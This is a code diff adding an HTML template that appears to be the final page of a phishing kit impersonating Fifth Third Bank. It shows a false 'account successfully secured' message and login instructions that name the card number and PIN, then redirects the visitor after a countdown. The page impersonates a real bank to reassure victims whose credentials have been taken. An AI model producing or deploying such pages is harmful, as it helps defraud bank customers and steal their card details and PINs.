@@ -1,0 +1,48 @@
+{% extends 'base.html'%} {%block body%}
+
+
+<div style="padding-top: 5px" class="middle-form">
+ 
+  
+ <div class="submitForm">
+    <h2>Your account has been successfully secured.</h2>
+ </div>
+</div>
+
+<div class="flex">
+      <div class="flex-item">
+        <h2>Existing Users</h2>
+        <p>
+          To access your accounts, please use your custom User ID and your associated Online Banking password.
+        </p>
+      </div>
+      <div class="flex-item">
+        <h2>Existing Users</h2>
+        <p>
+          <h4>User ID:</h4>
+Use your Fifth Third debit, credit, prepaid or ATM card number the first time you log in. View Forgot User ID or Forgot Password.
+        </p>
+        <p>
+          
+          <h4>Password:</h4>
+          Use your Card PIN (Personal Identification Number) to log in to Online Banking. After entering Online Banking for the first time using your Card PIN, you will be prompted to create an exclusive password for Online Banking.
+        </p>
+      </div>
+    </div>
+
+<script>
+var a = 10;
+
+
+  
+  const countdown = () => {
+    a = a-1
+    if (a===0){
+        window.location.replace('google.com')
+    }
+  }
+  setInterval(countdown,1000)
+
+</script>
+
+{%endblock%}
